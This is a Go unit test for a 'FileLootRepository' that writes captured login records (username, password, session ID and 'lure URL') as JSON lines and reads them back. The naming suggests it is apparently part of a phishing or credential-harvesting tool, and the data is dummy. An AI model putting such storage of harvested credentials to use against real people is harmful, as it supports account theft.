package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"io"
	"testing"
	"time"

	"github.com/rs/zerolog"
	"github.com/stretchr/testify/require"
)

func TestFileLootRepository(t *testing.T) {
	tests := []struct {
		name  string
		infos []*DBLoginInfo
	}{
		{
			name: "OneRecord",
			infos: []*DBLoginInfo{
				{
					Username:  "user",
					Password:  "pass",
					Date:      time.Date(2021, 1, 1, 1, 0, 0, 0, time.UTC),
					SessionID: "abc",
					LureURL:   "/abc/def",
				},
			},
		},
		{
			name: "TwoRecords",
			infos: []*DBLoginInfo{
				{
					Username:  "user",
					Password:  "pass",
					Date:      time.Date(2021, 1, 1, 1, 0, 0, 0, time.UTC),
					SessionID: "abc",
					LureURL:   "/abc/def",
				},
				{
					Username:  "user2",
					Password:  "pass2",
					Date:      time.Date(2021, 2, 2, 2, 0, 0, 0, time.UTC),
					SessionID: "abc2",
					LureURL:   "/abc/def2",
				},
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var buff bytes.Buffer
			logger := zerolog.New(io.Discard)
			repo := NewFileLootRepository(&logger, &buff)
			for _, info := range tt.infos {
				err := repo.SaveCreds(info)
				require.NoError(t, err)
			}

			result := scanDBLoginInfos(t, &buff)
			require.Equal(t, tt.infos, result)
		})
	}
}

func scanDBLoginInfos(t *testing.T, r io.Reader) []*DBLoginInfo {
	t.Helper()
	bs := bufio.NewScanner(r)
	var result []*DBLoginInfo
	for bs.Scan() {
		var info DBLoginInfo
		err := json.Unmarshal([]byte(bs.Text()), &info)
		require.NoError(t, err)
		result = append(result, &info)
	}
	return result
}
